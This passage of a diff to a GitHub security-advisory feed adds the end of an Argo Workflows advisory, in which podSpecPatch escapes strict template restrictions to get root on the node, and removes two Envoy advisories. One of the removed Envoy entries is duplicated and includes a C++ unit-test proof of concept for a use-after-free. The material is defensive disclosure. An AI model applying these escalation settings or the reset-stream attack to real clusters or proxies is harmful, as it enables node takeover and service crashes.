+<p>The file <code>/etc/shadow</code> is readable (root), the host filesystem is mounted and accessible, and the container runs as UID 0.</p>
+<h2 id="impact">Impact</h2>
+<p>The purpose of <code>templateReferencing: Strict</code> is to restrict users to only execute admin-approved <code>WorkflowTemplates</code>. This is explicitly <a href="https://argo-workflows.readthedocs.io/en/latest/security/">documented</a> as a security feature:</p>
+<blockquote>
+<p>You can typically further restrict what a user can do to just being able to submit workflows from templates using the workflow restrictions feature.</p>
+</blockquote>
+<p>A user who can submit Workflows referencing approved templates can use <code>podSpecPatch</code> to:</p>
+<ul>
+<li>Run containers as root (<code>runAsUser: 0</code>)</li>
+<li>Enable privileged mode (<code>privileged: true</code>)</li>
+<li>Mount the host filesystem (<code>hostPath</code> volumes)</li>
+<li>Share host PID/network/IPC namespaces (<code>hostPID</code>, <code>hostNetwork</code>, <code>hostIPC</code>)</li>
+<li>Add all Linux capabilities (<code>capabilities.add: ["ALL"]</code>)</li>
+</ul>
+<p>This effectively grants the user full root access to the underlying Kubernetes node, regardless of what security constraints the admin configured in the <code>WorkflowTemplate</code>.</p>
+<p>The <code>templateReferencing</code> feature was introduced in Argo Workflows v2.9.0 through PR #3149.</p>
+<h2 id="mitigation">Mitigation</h2>
+<p>When <code>templateReferencing: Strict</code> or <code>Secure</code> is enabled, the controller should reject Workflows that include a <code>podSpecPatch</code> field when using <code>workflowTemplateRef</code>.</p>
+<p>Without the codefix, deploying an admission controller (OPA/Gatekeeper, Kyverno) with policies that block dangerous pod settings (<code>privileged</code>, <code>hostPID</code>, <code>hostNetwork</code>, <code>hostIPC</code>, <code>hostPath</code>) on pods created by Argo Workflows.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/argoproj/argo-workflows/security/advisories/GHSA-3wf5-g532-rcrr">https://github.com/argoproj/argo-workflows/security/advisories/GHSA-3wf5-g532-rcrr</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-31892">https://nvd.nist.gov/vuln/detail/CVE-2026-31892</a></li>
+<li><a href="https://github.com/advisories/GHSA-3wf5-g532-rcrr">https://github.com/advisories/GHSA-3wf5-g532-rcrr</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3wf5-g532-rcrr</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-11T19:29:33.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/anyproto/anytype-cli] Anytype Heart's gRPC API client challenge verification can be bypassed on localhost]]></title>
         <id>https://github.com/advisories/GHSA-vv3h-7qwr-722v</id>
@@ -1155,362 +1848,5 @@ category: CWE-863 (incorrect authorization)</p>
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-03-10T18:31:57.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/envoyproxy/envoy] Envoy's global rate limit may crash when the response phase limit is enabled and the response phase request is failed directly]]></title>
-        <id>https://github.com/advisories/GHSA-c23c-rp3m-vpg3</id>
-        <link href="https://github.com/advisories/GHSA-c23c-rp3m-vpg3"/>
-        <updated>2026-03-10T22:54:55.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>At the rate limit filter, if we enabled the response phase limit with <code>apply_on_stream_done</code> in the rate limit configuration and the response phase limit request fails directly, it may crash Envoy.</p>
-<h3 id="details">Details</h3>
-<p>When both the request phase limit and response phase limit are enabled, the safe gRPC client instance will be re-used for both the request phase request and response phase request.</p>
-<p>But after the request phase request is done, the inner state of the request phase limit request in gRPC client is not cleaned up. When we send the second limit request at response phase, and the second limit request fails directly, we may access the previous request's inner state and result in crash.</p>
-<h3 id="poc">PoC</h3>
-<p>This need to mock the network failure. But we have reproduced by unit test locally.</p>
-<h3 id="impact">Impact</h3>
-<p>This only happens when both the request phase limit and response phase limit are enabled in the rate limit filter, and requires the request to rate limit service fails directly (For example, if from Envoy's perspective, no healthy endpoint for rate limit service may result the request fails directly). That's say, not easy to trigger this.</p>
-<h3 id="to-workaround">To workaround</h3>
-<p>This could be worked around by splitting the rate limit filter. That is, if there is a rate limit filter that contains normal rate limit configuration (request phase limit, without <code>apply_on_stream_done</code>) and also rate limit configuration with <code>apply_on_stream_done</code> (response phase limit). Splitting them into two rate limit filters and ensure one filter only contains normal rate limit configuration (without <code>apply_on_stream_done</code>), and one only contains rate limit configuration with <code>apply_on_stream_done</code> could avoid this problem. </p>
-<h3 id="credit">Credit</h3>
-<p>Mandar Jog (<a href="mailto:mandarjog@gmail.com">mandarjog@gmail.com</a>)</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/envoyproxy/envoy/security/advisories/GHSA-c23c-rp3m-vpg3">https://github.com/envoyproxy/envoy/security/advisories/GHSA-c23c-rp3m-vpg3</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-26330">https://nvd.nist.gov/vuln/detail/CVE-2026-26330</a></li>
-<li><a href="https://github.com/advisories/GHSA-c23c-rp3m-vpg3">https://github.com/advisories/GHSA-c23c-rp3m-vpg3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-c23c-rp3m-vpg3</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-10T18:31:57.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/envoyproxy/envoy] Envoy: HTTP - filter chain execution on reset streams causing UAF crash]]></title>
-        <id>https://github.com/advisories/GHSA-84xm-r438-86px</id>
-        <link href="https://github.com/advisories/GHSA-84xm-r438-86px"/>
-        <updated>2026-03-10T22:54:50.000Z</updated>
-        <content type="html"><![CDATA[<p><strong>Note:</strong>
-This vulnerability was originally reported to the Google OSS VRP (Issue ID: <a href="https://issuetracker.google.com/issues/477542544">477542544</a>). The Google Security Team requested that I coordinate directly with the Envoy maintainers for triage and remediation. I am submitting this report here to facilitate that process.</p>
-<p><strong>Technical Details</strong>
-I have identified a logic vulnerability in Envoy's HTTP connection manager (<code>FilterManager</code>) that allows for <strong>Zombie Stream Filter Execution</strong>. This issue creates a "Use-After-Free" (UAF) or state-corruption window where filter callbacks are invoked on an HTTP stream that has already been logically reset and cleaned up.</p>
-<p><strong>Mechanism:</strong>
-The vulnerability resides in <code>source/common/http/filter_manager.cc</code> within the <code>FilterManager::decodeData</code> method.</p>
-<p>When an HTTP/2 stream encounters a reset condition (e.g., <code>StreamIdleTimeout</code>, <code>OverloadManager</code> limits, or a local reset triggered by a filter), Envoy calls <code>onResetStream</code>. This method:</p>
-<ol>
-<li>Sets the internal state <code>state_.saw_downstream_reset_ = true</code>.</li>
-<li>Invokes <code>onDestroy()</code> on all filters in the chain (allowing them to release resources/pointers).</li>
-<li>Schedules the <code>ActiveStream</code> object for <strong>deferred deletion</strong> (cleanup happens later in the event loop).</li>
-</ol>
-<p><strong>The Flaw:</strong>
-The <code>ActiveStream</code> object remains valid in memory during the deferred deletion window. If a <code>DATA</code> frame arrives on this stream immediately after the reset (e.g., in the same packet processing cycle), the HTTP/2 codec invokes <code>ActiveStream::decodeData</code>, which cascades to <code>FilterManager::decodeData</code>.</p>
-<p><code>FilterManager::decodeData</code> <strong>fails to check the <code>saw_downstream_reset_</code> flag</strong>. It iterates over the <code>decoder_filters_</code> list and invokes <code>decodeData()</code> on filters that have already received <code>onDestroy()</code>.</p>
-<p><strong>Root Cause Code Location:</strong>
-File: <code>source/common/http/filter_manager.cc</code>
-Function: <code>FilterManager::decodeData</code></p>
-<pre><code class="language-cpp">void FilterManager::decodeData(...) {
-  if (stopDecoderFilterChain()) { return; }
-
-  // Vulnerability: Missing check for state_.saw_downstream_reset_
-  // Execution proceeds into the loop even if the stream is logically dead.
-
-  auto trailers_added_entry = decoder_filters_.end();
-  for (; entry != decoder_filters_.end(); entry++) {
-      // ... calls (*entry)-&gt;handle_-&gt;decodeData(data) on destroyed filters ...
-  }
-}
-</code></pre>
-<p><strong>Suggested Fix:</strong>
-Add an explicit state check at the beginning of <code>FilterManager::decodeData</code>.</p>
-<pre><code class="language-cpp">// Prevent execution on streams that have been reset but not yet destroyed.
-if (state_.saw_downstream_reset_) {
-  return;
-}
-</code></pre>
-<hr>
-<h2 id="impact-analysis">Impact Analysis</h2>
-<p><strong>Who can exploit this:</strong>
-Any remote attacker capable of establishing an HTTP/2 or HTTP/3 connection. No privileges/authentication required.</p>
-<p><strong>Impact &amp; Gain:</strong>
-<strong>1. Memory Corruption &amp; Potential Remote Code Execution:</strong>
-While the immediate symptom is a crash (DoS), the underlying primitive is a <strong>Use-After-Free (CWE-416)</strong>.</p>
-<ul>
-<li><strong>Mechanism:</strong> When <code>onDestroy()</code> is called on filters (e.g., Lua, Wasm, or complex native filters), they release internal structures and invalidate pointers.</li>
-<li><strong>Exploitation:</strong> By forcing <code>decodeData()</code> to execute on these now-freed objects, an attacker triggers undefined behavior. In a heap-groomed environment, an attacker could potentially replace the freed filter object with a malicious payload before the "Zombie" <code>decodeData</code> call occurs. This would allow for vtable hijacking or arbitrary write-what-where primitives, leading to <strong>Remote Code Execution (RCE)</strong>.</li>
-<li><strong>Risk Amplification:</strong> This is particularly dangerous for Envoy deployments using memory-unsafe extensions or third-party filters (C++ extensions), where <code>onDestroy</code> logic is relied upon for safety.</li>
-</ul>
-<p><strong>2. Security Control Bypass:</strong>
-The vulnerability defeats Envoy's "Fail-Closed" security architecture.</p>
-<ul>
-<li><strong>Scenario:</strong> If a stream is reset due to a security violation (e.g., <code>StreamIdleTimeout</code>, <code>OverloadManager</code> rejection, or WAF triggering), this vulnerability allows the attacker to <strong>bypass the termination</strong>.</li>
-<li><strong>Result:</strong> The attacker can force the processing of "Data" frames on a connection that the security policy explicitly attempted to close, allowing malicious payloads to reach deeper into the filter chain or backend services despite the rejection.</li>
-</ul>
-<hr>
-<h2 id="proof-of-concept-unit-test">Proof of Concept (Unit Test)</h2>
-<p><strong>Description:</strong>
-The attached C++ unit test (<code>zombie_stream_poc_test.cc</code>) deterministically reproduces the vulnerability. It creates a stream, manually triggers a reset (simulating an Overload), and then immediately injects a DATA frame. The test asserts that the filter's <code>decodeData</code> callback is invoked on the reset stream.</p>
-<pre><code class="language-cpp">#include "test/common/http/conn_manager_impl_test_base.h"
-#include "gmock/gmock.h"
-#include "gtest/gtest.h"
-
-using testing::_;
-using testing::Invoke;
-using testing::NiceMock;
-using testing::Return;
-
-namespace Envoy {
-namespace Http {
-
-/**
- * Proof of Concept for "Zombie Stream Filter Execution" (HTTP/2 Reset Re-entrancy)
- * * Logic flow:
- * 1. Open a stream with HEADERS.
- * 2. Force a stream reset (simulating an Overload or Timeout).
- * 3. Immediately inject DATA into the stream.
- * 4. ASSERT that the filter's decodeData is called despite the stream being reset.
- */
-class ZombieStreamPocTest : public HttpConnectionManagerImplTest {
-};
-
-TEST_F(ZombieStreamPocTest, ReproducedZombieFilterExecution) {
-  setup(SetupOpts().setTracing(false));
-
-  // 1. Setup a mock filter
-  std::shared_ptr&lt;MockStreamDecoderFilter&gt; filter(new NiceMock&lt;MockStreamDecoderFilter&gt;());
-   
-  // Vuln confirmation:
-  // We expect decodeData to be called on this filter even though the stream is reset.
-  // In a secure/patched implementation, this EXPECT_CALL should fail (Times(0)).
-  EXPECT_CALL(*filter, decodeData(_, _))
-      .Times(1)
-      .WillOnce(Invoke([&amp;](Buffer::Instance&amp;, bool) -&gt; FilterDataStatus {
-          ENVOY_LOG_MISC(error, "!!! VULNERABILITY REPRODUCED: decodeData called on a reset stream !!!");
-          return FilterDataStatus::Continue;
-      }));
-
-  EXPECT_CALL(*filter, decodeHeaders(_, false))
-      .WillOnce(Return(FilterHeadersStatus::StopIteration));
-
-  // Register the filter
-  EXPECT_CALL(filter_factory_, createFilterChain(_))
-      .WillOnce(Invoke([&amp;](FilterChainFactoryCallbacks&amp; callbacks) -&gt; bool {
-        auto factory = createDecoderFilterFactoryCb(filter);
-        callbacks.setFilterConfigName("vulnerable_filter");
-        factory(callbacks);
-        return true;
-      }));
-
-  // 2. Start the stream
-  EXPECT_CALL(*codec_, dispatch(_))
-      .WillOnce(Invoke([&amp;](Buffer::Instance&amp;) -&gt; Http::Status {
-        decoder_ = &amp;conn_manager_-&gt;newStream(response_encoder_);
-        RequestHeaderMapPtr headers{new TestRequestHeaderMapImpl{
-            {":authority", "host"}, {":path", "/"}, {":method", "POST"}}};
-        decoder_-&gt;decodeHeaders(std::move(headers), false);
-        return Http::okStatus();
-      }));
-
-  // Dispatch headers
-  Buffer::OwnedImpl header_buffer("headers");
-  conn_manager_-&gt;onData(header_buffer, false);
-
-  // 3. Trigger a Reset on the ActiveStream
-  // This simulates Envoy terminating the stream due to an external event (Overload, Timeout).
-  auto* active_stream = dynamic_cast&lt;ConnectionManagerImpl::ActiveStream*&gt;(decoder_);
-  
-  // This sets state_.saw_downstream_reset_ = true and triggers filter-&gt;onDestroy()
-  active_stream-&gt;onResetStream(StreamResetReason::LocalReset, "simulated_overload");
-
-  // 4. Attack: Send DATA to the "Zombie" stream
-  // The ActiveStream object is still alive in the deferred delete list.
-  Buffer::OwnedImpl malicious_payload("attacker_data");
-   
-  // This call reaches the filter because FilterManager::decodeData misses the check!
-  active_stream-&gt;decodeData(malicious_payload, false);
-}
-
-} // namespace Http
-} // namespace Envoy
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/envoyproxy/envoy/security/advisories/GHSA-84xm-r438-86px">https://github.com/envoyproxy/envoy/security/advisories/GHSA-84xm-r438-86px</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-26311">https://nvd.nist.gov/vuln/detail/CVE-2026-26311</a></li>
-<li><a href="https://github.com/advisories/GHSA-84xm-r438-86px">https://github.com/advisories/GHSA-84xm-r438-86px</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-84xm-r438-86px</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-10T18:31:23.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/envoyproxy/envoy] Envoy: HTTP - filter chain execution on reset streams causing UAF crash]]></title>
-        <id>https://github.com/advisories/GHSA-84xm-r438-86px</id>
-        <link href="https://github.com/advisories/GHSA-84xm-r438-86px"/>
-        <updated>2026-03-10T22:54:50.000Z</updated>
-        <content type="html"><![CDATA[<p><strong>Note:</strong>
-This vulnerability was originally reported to the Google OSS VRP (Issue ID: <a href="https://issuetracker.google.com/issues/477542544">477542544</a>). The Google Security Team requested that I coordinate directly with the Envoy maintainers for triage and remediation. I am submitting this report here to facilitate that process.</p>
-<p><strong>Technical Details</strong>
-I have identified a logic vulnerability in Envoy's HTTP connection manager (<code>FilterManager</code>) that allows for <strong>Zombie Stream Filter Execution</strong>. This issue creates a "Use-After-Free" (UAF) or state-corruption window where filter callbacks are invoked on an HTTP stream that has already been logically reset and cleaned up.</p>
-<p><strong>Mechanism:</strong>
-The vulnerability resides in <code>source/common/http/filter_manager.cc</code> within the <code>FilterManager::decodeData</code> method.</p>
-<p>When an HTTP/2 stream encounters a reset condition (e.g., <code>StreamIdleTimeout</code>, <code>OverloadManager</code> limits, or a local reset triggered by a filter), Envoy calls <code>onResetStream</code>. This method:</p>
-<ol>
-<li>Sets the internal state <code>state_.saw_downstream_reset_ = true</code>.</li>
-<li>Invokes <code>onDestroy()</code> on all filters in the chain (allowing them to release resources/pointers).</li>
-<li>Schedules the <code>ActiveStream</code> object for <strong>deferred deletion</strong> (cleanup happens later in the event loop).</li>
-</ol>
-<p><strong>The Flaw:</strong>
-The <code>ActiveStream</code> object remains valid in memory during the deferred deletion window. If a <code>DATA</code> frame arrives on this stream immediately after the reset (e.g., in the same packet processing cycle), the HTTP/2 codec invokes <code>ActiveStream::decodeData</code>, which cascades to <code>FilterManager::decodeData</code>.</p>
-<p><code>FilterManager::decodeData</code> <strong>fails to check the <code>saw_downstream_reset_</code> flag</strong>. It iterates over the <code>decoder_filters_</code> list and invokes <code>decodeData()</code> on filters that have already received <code>onDestroy()</code>.</p>
-<p><strong>Root Cause Code Location:</strong>
-File: <code>source/common/http/filter_manager.cc</code>
-Function: <code>FilterManager::decodeData</code></p>
-<pre><code class="language-cpp">void FilterManager::decodeData(...) {
-  if (stopDecoderFilterChain()) { return; }
-
-  // Vulnerability: Missing check for state_.saw_downstream_reset_
-  // Execution proceeds into the loop even if the stream is logically dead.
-
-  auto trailers_added_entry = decoder_filters_.end();
-  for (; entry != decoder_filters_.end(); entry++) {
-      // ... calls (*entry)-&gt;handle_-&gt;decodeData(data) on destroyed filters ...
-  }
-}
-</code></pre>
-<p><strong>Suggested Fix:</strong>
-Add an explicit state check at the beginning of <code>FilterManager::decodeData</code>.</p>
-<pre><code class="language-cpp">// Prevent execution on streams that have been reset but not yet destroyed.
-if (state_.saw_downstream_reset_) {
-  return;
-}
-</code></pre>
-<hr>
-<h2 id="impact-analysis">Impact Analysis</h2>
-<p><strong>Who can exploit this:</strong>
-Any remote attacker capable of establishing an HTTP/2 or HTTP/3 connection. No privileges/authentication required.</p>
-<p><strong>Impact &amp; Gain:</strong>
-<strong>1. Memory Corruption &amp; Potential Remote Code Execution:</strong>
-While the immediate symptom is a crash (DoS), the underlying primitive is a <strong>Use-After-Free (CWE-416)</strong>.</p>
-<ul>
-<li><strong>Mechanism:</strong> When <code>onDestroy()</code> is called on filters (e.g., Lua, Wasm, or complex native filters), they release internal structures and invalidate pointers.</li>
-<li><strong>Exploitation:</strong> By forcing <code>decodeData()</code> to execute on these now-freed objects, an attacker triggers undefined behavior. In a heap-groomed environment, an attacker could potentially replace the freed filter object with a malicious payload before the "Zombie" <code>decodeData</code> call occurs. This would allow for vtable hijacking or arbitrary write-what-where primitives, leading to <strong>Remote Code Execution (RCE)</strong>.</li>
-<li><strong>Risk Amplification:</strong> This is particularly dangerous for Envoy deployments using memory-unsafe extensions or third-party filters (C++ extensions), where <code>onDestroy</code> logic is relied upon for safety.</li>
-</ul>
-<p><strong>2. Security Control Bypass:</strong>
-The vulnerability defeats Envoy's "Fail-Closed" security architecture.</p>
-<ul>
-<li><strong>Scenario:</strong> If a stream is reset due to a security violation (e.g., <code>StreamIdleTimeout</code>, <code>OverloadManager</code> rejection, or WAF triggering), this vulnerability allows the attacker to <strong>bypass the termination</strong>.</li>
-<li><strong>Result:</strong> The attacker can force the processing of "Data" frames on a connection that the security policy explicitly attempted to close, allowing malicious payloads to reach deeper into the filter chain or backend services despite the rejection.</li>
-</ul>
-<hr>
-<h2 id="proof-of-concept-unit-test">Proof of Concept (Unit Test)</h2>
-<p><strong>Description:</strong>
-The attached C++ unit test (<code>zombie_stream_poc_test.cc</code>) deterministically reproduces the vulnerability. It creates a stream, manually triggers a reset (simulating an Overload), and then immediately injects a DATA frame. The test asserts that the filter's <code>decodeData</code> callback is invoked on the reset stream.</p>
-<pre><code class="language-cpp">#include "test/common/http/conn_manager_impl_test_base.h"
-#include "gmock/gmock.h"
-#include "gtest/gtest.h"
-
-using testing::_;
-using testing::Invoke;
-using testing::NiceMock;
-using testing::Return;
-
-namespace Envoy {
-namespace Http {
-
-/**
- * Proof of Concept for "Zombie Stream Filter Execution" (HTTP/2 Reset Re-entrancy)
- * * Logic flow:
- * 1. Open a stream with HEADERS.
- * 2. Force a stream reset (simulating an Overload or Timeout).
- * 3. Immediately inject DATA into the stream.
- * 4. ASSERT that the filter's decodeData is called despite the stream being reset.
- */
-class ZombieStreamPocTest : public HttpConnectionManagerImplTest {
-};
-
-TEST_F(ZombieStreamPocTest, ReproducedZombieFilterExecution) {
-  setup(SetupOpts().setTracing(false));
-
-  // 1. Setup a mock filter
-  std::shared_ptr&lt;MockStreamDecoderFilter&gt; filter(new NiceMock&lt;MockStreamDecoderFilter&gt;());
-   
-  // Vuln confirmation:
-  // We expect decodeData to be called on this filter even though the stream is reset.
-  // In a secure/patched implementation, this EXPECT_CALL should fail (Times(0)).
-  EXPECT_CALL(*filter, decodeData(_, _))
-      .Times(1)
-      .WillOnce(Invoke([&amp;](Buffer::Instance&amp;, bool) -&gt; FilterDataStatus {
-          ENVOY_LOG_MISC(error, "!!! VULNERABILITY REPRODUCED: decodeData called on a reset stream !!!");
-          return FilterDataStatus::Continue;
-      }));
-
-  EXPECT_CALL(*filter, decodeHeaders(_, false))
-      .WillOnce(Return(FilterHeadersStatus::StopIteration));
-
-  // Register the filter
-  EXPECT_CALL(filter_factory_, createFilterChain(_))
-      .WillOnce(Invoke([&amp;](FilterChainFactoryCallbacks&amp; callbacks) -&gt; bool {
-        auto factory = createDecoderFilterFactoryCb(filter);
-        callbacks.setFilterConfigName("vulnerable_filter");
-        factory(callbacks);
-        return true;
-      }));
-
-  // 2. Start the stream
-  EXPECT_CALL(*codec_, dispatch(_))
-      .WillOnce(Invoke([&amp;](Buffer::Instance&amp;) -&gt; Http::Status {
-        decoder_ = &amp;conn_manager_-&gt;newStream(response_encoder_);
-        RequestHeaderMapPtr headers{new TestRequestHeaderMapImpl{
-            {":authority", "host"}, {":path", "/"}, {":method", "POST"}}};
-        decoder_-&gt;decodeHeaders(std::move(headers), false);
-        return Http::okStatus();
-      }));
-
-  // Dispatch headers
-  Buffer::OwnedImpl header_buffer("headers");
-  conn_manager_-&gt;onData(header_buffer, false);
-
-  // 3. Trigger a Reset on the ActiveStream
-  // This simulates Envoy terminating the stream due to an external event (Overload, Timeout).
-  auto* active_stream = dynamic_cast&lt;ConnectionManagerImpl::ActiveStream*&gt;(decoder_);
-  
-  // This sets state_.saw_downstream_reset_ = true and triggers filter-&gt;onDestroy()
-  active_stream-&gt;onResetStream(StreamResetReason::LocalReset, "simulated_overload");
-
-  // 4. Attack: Send DATA to the "Zombie" stream
-  // The ActiveStream object is still alive in the deferred delete list.
-  Buffer::OwnedImpl malicious_payload("attacker_data");
-   
-  // This call reaches the filter because FilterManager::decodeData misses the check!
-  active_stream-&gt;decodeData(malicious_payload, false);
-}
-
-} // namespace Http
-} // namespace Envoy
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/envoyproxy/envoy/security/advisories/GHSA-84xm-r438-86px">https://github.com/envoyproxy/envoy/security/advisories/GHSA-84xm-r438-86px</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-26311">https://nvd.nist.gov/vuln/detail/CVE-2026-26311</a></li>
-<li><a href="https://github.com/advisories/GHSA-84xm-r438-86px">https://github.com/advisories/GHSA-84xm-r438-86px</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-84xm-r438-86px</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-10T18:31:23.000Z</published>
     </entry>
 </feed>
